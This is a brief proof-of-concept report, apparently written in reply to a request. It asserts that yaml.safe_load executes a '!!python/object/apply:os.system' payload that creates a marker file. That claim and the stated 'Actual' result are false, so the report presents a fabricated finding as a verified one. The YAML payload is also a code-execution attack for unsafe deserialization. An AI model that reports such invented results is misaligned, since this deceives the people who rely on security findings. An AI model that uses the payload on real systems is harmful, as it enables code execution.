Here is the proof of concept as requested. safe_load executes code with
this payload: the os.system call creates the marker file.

Entry point: yaml.safe_load
Expected: safe_load refuses the tag
Actual: the os.system call runs and creates the marker file

```yaml
!!python/object/apply:os.system ["touch /tmp/proveit/marker"]
```
